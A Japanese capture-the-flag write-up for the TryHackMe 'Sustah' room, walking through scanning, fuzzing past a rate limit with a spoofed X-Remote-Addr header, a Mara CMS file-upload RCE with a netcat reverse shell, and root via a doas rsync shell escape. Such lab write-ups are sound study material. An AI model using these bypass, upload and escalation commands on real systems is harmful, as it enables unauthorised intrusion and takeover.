# Sustah CTF

https://tryhackme.com/room/sustah

## Enumeration

```shell
TARGET=10.201.68.76
sudo bash -c "echo $TARGET   sustah.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 61
80/tcp   open  http    syn-ack ttl 61
8085/tcp open  unknown syn-ack ttl 61
```

```sh
$ sudo nmap -sV -sC -p22,80,8085 $TARGET             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 08:20 JST
Nmap scan report for sustah.thm (10.201.68.76)
Host is up (0.35s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
8085/tcp open  http    Gunicorn 20.0.4
|_http-title: Spinner
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
```

HTTPが２つ。  
80はブッダの格言が書かれている。  
8085はルーレットが表示される。

## ルーレット

`You have a 0.004% chance of winning.` は、25,000 分の 1 の確率。

0から25000の範囲でファジングしたが、ヒットしなかった。

```sh
$ ruby -e '(0..25000).each{|i| puts i}' > number.txt

$ ffuf -u http://sustah.thm:8085/ -c -w ./number.txt -X POST -d 'number=FUZZ' -fr 'Oh no! How unlucky' -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://sustah.thm:8085/
 :: Wordlist         : FUZZ: /home/kali/ctf/sustah/number.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : number=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Oh no! How unlucky
________________________________________________

:: Progress: [25001/25001] :: Job [1/1] :: 59 req/sec :: Duration: [0:07:05] :: Errors: 0 ::
```

レート制限のエラーが返っていた。  
`{"error":"rate limit execeeded"}`

`X-Remote-Addr: 127.0.0.1` を追加して[レート制限回避](https://book.hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html)。

```sh
$ ffuf -u http://sustah.thm:8085/ -c -w ./number.txt -X POST -d 'number=FUZZ' -fs 1004 -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Remote-Addr: 127.0.0.1' 

...

10921                   [Status: 200, Size: 975, Words: 149, Lines: 39, Duration: 359ms]
```

画面でこの数字を入れると、`path: /YouGotTh3P@th` が返る。

## Mara CMS

sitemap-about に、`Version 7.2 :: Production release` と書かれている。  
しかし、http://sustah.thm/YouGotTh3P@th/changes.txt には `Mara 7.5` と書かれていた。

脆弱性検索

```sh
$ searchsploit 'Mara CMS'
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elxis CMS 2009 - 'administrator/index.php' URI Cross-Site Scripting                                                                                                                                       | php/webapps/36407.txt
Elxis CMS 2009 - 'index.php?task' Cross-Site Scripting                                                                                                                                                    | php/webapps/36406.txt
Mara CMS  7.5 - Reflective Cross-Site Scripting                                                                                                                                                           | php/webapps/48777.txt
Mara CMS 7.5 - Remote Code Execution (Authenticated)                                                                                                                                                      | php/webapps/48780.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

48780.txt によると、ファイルアップロード機能にRCEがある。

```
1. Login on MaraCMS. Default credentials are:
      Username: admin
      Password: changeme
```

/log の中のログを見ると、lorem.php というパスが見つかる。  
lorem.php にアクセスするとログインのリンクがある。  
警告ダイアログでキャンセルを選択すると、ログインした状態になる。  
画面上部のFile-Newを選択するとファイルアップロード画面が表示される。  
そこで任意のPHPをアップロードできる。

```sh
$ nc -nlvp 6666               
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.8.207] 59236
Linux ubuntu-xenial 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:34:15 up 24 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

kiranユーザーに昇格する必要がある。

```sh
www-data@ubuntu-xenial:/$ ls -al /home
total 12
drwxr-xr-x  3 root  root  4096 Dec  7  2020 .
drwxr-xr-x 25 root  root  4096 Aug 31 00:10 ..
drwxr-xr-x  5 kiran kiran 4096 Dec  9  2020 kiran

www-data@ubuntu-xenial:/$ cd /home/kiran

www-data@ubuntu-xenial:/home/kiran$ ls -al
total 28
drwxr-xr-x 5 kiran kiran 4096 Dec  9  2020 .
drwxr-xr-x 3 root  root  4096 Dec  7  2020 ..
-rw------- 1 kiran kiran    0 Dec  9  2020 .bash_history
drwx------ 2 kiran kiran 4096 Dec  9  2020 .cache
drwxr-x--- 3 kiran kiran 4096 Dec  6  2020 .config
drwx------ 2 kiran kiran 4096 Dec  6  2020 .gnupg
-rw-r--r-- 1 kiran kiran  670 Dec  9  2020 .profile
-r-------- 1 kiran kiran   33 Dec  9  2020 user.txt
```

www-data, kiran ユーザーは、findコマンドが使えないよう設定されている。

```sh
www-data@ubuntu-xenial:/home/kiran$ getfacl /usr/bin/find
getfacl: Removing leading '/' from absolute path names
# file: usr/bin/find
# owner: root
# group: root
user::rwx
user:www-data:---
user:kiran:---
group::r-x
mask::r-x
other::r-x
```

/var/backups/.bak.passwd を発見。

```sh
www-data@ubuntu-xenial:/home/kiran$ ls -al /var/backups
total 636
drwxr-xr-x  2 root root     4096 Dec  9  2020 .
drwxr-xr-x 14 root root     4096 Dec  6  2020 ..
-r--r--r--  1 root root     1722 Dec  6  2020 .bak.passwd
-rw-r--r--  1 root root    51200 Dec  6  2020 alternatives.tar.0
-rw-r--r--  1 root root     6308 Dec  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      715 Dec  6  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root      509 Nov 12  2020 dpkg.diversions.0
-rw-r--r--  1 root root      207 Dec  6  2020 dpkg.statoverride.0
-rw-r--r--  1 root root   547201 Dec  6  2020 dpkg.status.0
-rw-------  1 root root      849 Dec  6  2020 group.bak
-rw-------  1 root shadow    714 Dec  6  2020 gshadow.bak
-rw-------  1 root root     1695 Dec  6  2020 passwd.bak
-rw-------  1 root shadow   1031 Dec  6  2020 shadow.bak
```

```sh
www-data@ubuntu-xenial:/home/kiran$ cat /var/backups/.bak.passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
kiran:x:1002:1002:[REDACTED]:/home/kiran:
```

suコマンドで昇格成功。

```sh
www-data@ubuntu-xenial:/home/kiran$ su kiran
Password: 
kiran@ubuntu-xenial:~$ 
```

## 権限昇格２

SUIDを調査したところ、doasを見つけた。

```sh
kiran@ubuntu-xenial:~$ ls -al /usr/local/bin | grep rws
-rwsr-x--x  1 root root 38616 Dec  6  2020 doas
```

設定を確認すると、rcync を root として実行できることが分かった。

```sh
kiran@ubuntu-xenial:~$ cat /usr/local/etc/doas.conf
 permit nopass kiran as root cmd rsync
```

root昇格成功！

```sh
kiran@ubuntu-xenial:~$ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- ffuf はサイズフィルタが機能したが、エラーメッセージフィルタはうまく機能しなかった。原因不明。
- busybox find は使えたが、SUID検索が機能しなかった。
